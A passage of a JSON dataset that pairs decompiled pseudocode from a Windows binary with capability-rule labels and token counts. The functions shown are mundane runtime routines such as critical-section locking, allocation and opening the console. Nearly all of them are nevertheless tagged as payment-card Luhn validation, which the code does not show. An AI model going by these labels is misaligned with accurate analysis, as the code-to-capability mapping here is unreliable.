        "decompiled_code": "\nvoid __cdecl fcn.00409432(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00409417(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.004083c9(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 119
    },
    "0040a793": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a793(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 42
    },
    "0040a7a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a7a7(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 45
    },
    "0040a9ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a9ff(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x41d000);\n    return;\n}\n",
        "token_count": 50
    },
    "0040aa47": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aa47(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x41d000);\n    return;\n}\n",
        "token_count": 50
    },
    "0040ae45": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040ae45(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.0040ae7a();\n    if (iVar1 == 0) {\n        **(in_ECX + 4) = arg_8h;\n        *(in_ECX + 4) = *(in_ECX + 4) + 4;\n        iVar1 = 0;\n    }\n    else {\n        fcn.0040826e(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 130
    },
    "0040c6fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c6fd(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch == 0) || (arg_10h <= 0xffffffe0 / arg_ch)) {\n        if (arg_8h == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.004104db(arg_8h);\n        }\n        arg_ch = arg_ch * arg_10h;\n        iVar2 = fcn.0041050e(arg_8h, arg_ch);\n        if ((iVar2 != 0) && (uVar3 < arg_ch)) {\n            fcn.00404e50(iVar2 + uVar3, 0, arg_ch - uVar3);\n        }\n    }\n    else {\n        puVar1 = fcn.00409404();\n        *puVar1 = 0xc;\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 249
    },
    "0040c9cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040c9cf(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409a9b();\n    return iVar1 + 8;\n}\n",
        "token_count": 45
    },
    "00413017": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413017(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00413cbe(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "00412406": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00412406(void)\n\n{\n    *0x41c750 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 62
    }
}